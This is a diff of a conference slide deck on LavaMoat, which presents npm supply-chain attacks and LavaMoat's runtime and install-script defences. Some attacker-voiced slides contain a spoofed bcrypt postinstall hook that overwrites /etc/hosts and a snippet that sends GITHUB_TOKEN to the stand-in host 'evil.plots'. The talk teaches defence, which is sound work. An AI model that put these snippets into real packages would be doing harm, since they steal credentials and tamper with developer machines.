@@ -4,7 +4,7 @@
 <head>
   <meta charset="utf-8">
 
-  <title>Hardened JavaScript</title>
+  <title>LavaMoat</title>
 
   <meta name="author" content="naugtur">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -31,7 +31,7 @@
     }
 
     #naugtur:before {
-      content: '@naugtur';
+      content: 'naugtur.pl';
       position: fixed;
       bottom: .5em;
       left: .5em;
@@ -170,20 +170,36 @@
 
     <div class="slides">
       <section>
-        <br><br>
-        <h1>I'm running code from the internet!</h1>
-        <br>
-        <h4>LavaMoat</h4>
-        <small>@naugtur, 2022/2023</small>
-      </section>
 
+        <section>
+          <br><br>
+          <h1>I'm running code from the internet!</h1>
+          <br>
+          <h4>LavaMoat</h4>
+          <small>@naugtur, 2022/2023</small>
+        </section>
+        <!-- <section data-markdown>
+          <textarea>
+#### My first 5 lines of JavaScript ever
+```js
+function kill(){
+  setTimeout('kill',0)
+  setTimeout('kill',0)
+}
+kill()
+```
+
+breaks Windows pre XP SP2
+          </textarea>
+        </section> -->
+      </section>
 
       <section class="moji" data-markdown>
         <textarea data-template>
           <br> <br>
           # ⌨️ -> ⚙️🖥️
           <br> <br> <br>
-          <sub><sup>Would you take a string from me and run it in your application's process?</sup></sub>
+          <sub><sup>Would you take a string I gave you and run it in your application's process?</sup></sub>
 
           ---
           <br> <br>
@@ -197,8 +213,7 @@
           # 👉📦👈
           <br> <br> <br>
           
-          <sub><sup>Yes, that's what npm packages are.  </sup></sub>
-            <sub><sup>And they're glorious.</sup></sub>
+          <sub><sup>Yes, that's what npm packages are - and they're glorious.</sup></sub>
 
        
           </textarea>
@@ -216,12 +231,12 @@
       </section>
 
 
+
+      <section data-markdown>
+        ## What could go wrong?
+      </section>
+
       <section>
-
-        <section data-markdown>
-          ## What could go wrong?
-        </section>
-
         <section class="animatedSlide bad">
 
           <img src="./npm.svg" alt="npm logo" style="width: 25%; margin-top:5%" class=" an-y an-start-loc">
@@ -229,7 +244,7 @@
           <div class="an-container"></div>
 
         </section>
-        <section>
+        <!-- <section>
 
           <br>
           <h4 class="fragment">exfiltration</h4>
@@ -239,7 +254,7 @@
           <h4 class="fragment">fs</h4>
           <h4 class="fragment">event-stream</h4>
           <img class="pad1 plain fragment" src="./ilus/shroom.png">
-        </section>
+        </section> -->
 
       </section>
 
@@ -249,14 +264,23 @@
       <section class="whitehat">
         <h3> Let's install some dependencies! </h3>
       </section>
-      <section class="blackhat">
+      <section class="blackhat animatedDependency">
         <h3> Ok, catch this: 📦 </h3>
+
+        I'm gonna sneak it in as <div class="dependencies">
+          <div class="adependency"> a dependency of </div>
+
+        </div>
+
+        <span> a dev dependency of yours</span>
+
       </section>
 
 
 
+
       <section class="whitehat">
-        <h4> I'm not runing it. </h4>
+        <h4> I'm not runing that. </h4>
       </section>
       <section class="blackhat">
         <h4> That's what you think. </h4>
@@ -277,6 +301,7 @@
       </section>
 
       <section data-markdown class="blackhat">
+        #### Using typescript maybe?
         ### Hold my 🍺
       </section>
 
@@ -294,18 +319,20 @@
       </section>
 
       <section data-markdown class="blackhat">
-        #### I can spoof that package name
+        <textarea>
+#### I can spoof that package name
+  
+```
+evilpackage/node_modules/bcrypt/package.json:
+  "scripts": {
+    "postinstall": "echo 💩 > /etc/hosts"
+    
+evilpackage/package.json:
+  "bundledDependencies": ["bcrypt"]
 
-        ```
-        evilpackage/node_modules/bcrypt/package.json:
-        "scripts": {
-        "postinstall": "echo 💩 > /etc/hosts"
-
-        evilpackage/package.json:
-        "bundledDependencies": ["bcrypt"]
-
-        $ npm publish
-        ```
+$ npm publish
+```
+        </textarea>
       </section>
 
       <section data-markdown class="whitehat">
@@ -316,19 +343,23 @@
         ![lavamoat](./lavamoat-logo.png)
       </section>
       <section data-markdown class="whitehat">
-        ```
-        $ allow-scripts setup
+        <textarea>
+#### @lavamoat/allow-scripts
 
-        $ allow-scripts auto
+```
+$ allow-scripts setup
 
-        ```
-        ```
-        package.json:
-        "scripts": {
-        "setup": "npm ci && allow-scripts"
+$ allow-scripts auto
 
-        ```
+```
+```
+package.json:
+  "scripts": {
+    "setup": "npm ci && allow-scripts"
 
+```
+          
+        </textarea>
       </section>
 
       <section class="blackhat">
@@ -347,6 +378,7 @@
       </section>
 
       <section data-markdown class="whitehat">
+        #### one RTFM later
         ```
         $ allow-scripts setup --experimental-bins
 
@@ -367,30 +399,32 @@
 
         but
 
-        but npm said it's a feature! 😭
+        but npm said it was a feature! 😭
       </section>
 
       <section data-markdown class="blackhat">
         #### let's get serious
 
-        > Dear ${ webpackPluginMaintainer },
+        > Dear ${ eslintPluginMaintainer },
         > I understand you're busy and I'd be happy to help with maintenance of your
         tiny but popular plugin...
 
 
       </section>
       <section data-markdown class="blackhat">
-        #### will you read entire node_modules?
+        <textarea>
+#### will you read entire node_modules?
 
-        ```
-        const credentials = process.env["GITHUB_TOKEN"];
-        const req = require('https').request({
-        hostname: 'evil.plots',
-        path: `/stolen/${credentials}`,
-        }, ()=>{});
-        req.end();
-        ```
-
+```
+const credentials = process.env["GITHUB_TOKEN"];
+const req = require('https').request({
+  hostname: 'evil.plots',
+  path: `/stolen/${credentials}`,
+}, ()=>{});
+req.end();
+```
+          
+        </textarea>
       </section>
       <section data-markdown class="blackhat">
         #### ok, just in case you do
@@ -414,7 +448,7 @@
 
       </section>
       <section data-markdown class="blackhat">
-        #### how far do you want me to go?
+        #### should I keep going?
 
         ![](./ilus/obfuscated.png)
 
@@ -429,7 +463,7 @@
 
       <section data-markdown class="whitehat">
         <textarea>
-#### yo, there's an app for that!
+#### it protects me at runtime
 
 ```
 package.json:
@@ -444,7 +478,7 @@ package.json:
           
 ```js
 ./lavamoat/node/policy.json:
-  "that-webpack-plugin>evil-dependency": {
+  "that-eslint-plugin>evil-dependency": {
     "builtin": {
       "https.request": true
     },
@@ -460,16 +494,27 @@ package.json:
           
 ```js
 ./lavamoat/node/policy.json:
-  "that-webpack-plugin>evil-dependency": {
+  "that-eslint-plugin>evil-dependency": {
     "builtin": {
-      "https.request": false
+      "https": false
     },
     "globals": {
-      "process.env": false
+      "process": false
     },
 
 ```
         
+---
+
+```
+$ npm run build
+
+Error: LavaMoat - required node builtin package not in 
+allowlist: package "evil-dependency" requested "https"
+
+TypeError: Cannot read properties of undefined 
+ (reading 'env')
+```
         </textarea>
       </section>
 
@@ -477,6 +522,8 @@ package.json:
 
       <section data-markdown class="blackhat">
         # (╯°□°)╯︵ ┻━┻
+
+        &nbsp;
 
         # how ?!
       </section>
@@ -492,11 +539,13 @@ package.json:
       <section data-markdown>
         <textarea data-template>
   # 🪄
-  ## SES (shim)
+  ## SES 
   
-    - `Compartment` - a scope for each package
-    - `lockdown` - no prototype-pollution etc.
-
+  Secure EcmaScript
+  
+  
+  Each package in its own compartment,  
+  with separate globals.
   ---
 
   ## Part of the language!
@@ -552,6 +601,7 @@ lint({ fs })
 - Separation between language and APIs
 - Power only reachable through scope
 - Compartment controls scope
+- Hardened JavaScript
 
 ---
 
@@ -686,11 +736,22 @@ example_payload
         if (event.currentSlide.classList.contains('bad')) {
           pkgs[4] = '💣';
           pkgs[10] = '🔥';
-          pkgs[29] = '👿';
+          pkgs[27] = '👿';
         }
         pkgs.forEach((icon, index) =>
           installAnimation(an, icon, 7777 * Math.log10((index) / 3 + 1))
         )
+      }
+
+      if (event.currentSlide.classList.contains('animatedDependency')) {
+        const dep = document.querySelector('.adependency');
+        const deps = document.querySelector('.dependencies');
+        deps.innerHTML = '';
+        ' '.repeat(8).split('').forEach((_, index) => {
+          setTimeout(() => {
+            deps.appendChild(dep.cloneNode(true));
+          }, (index + 3) * 1000)
+        })
       }
     })
 
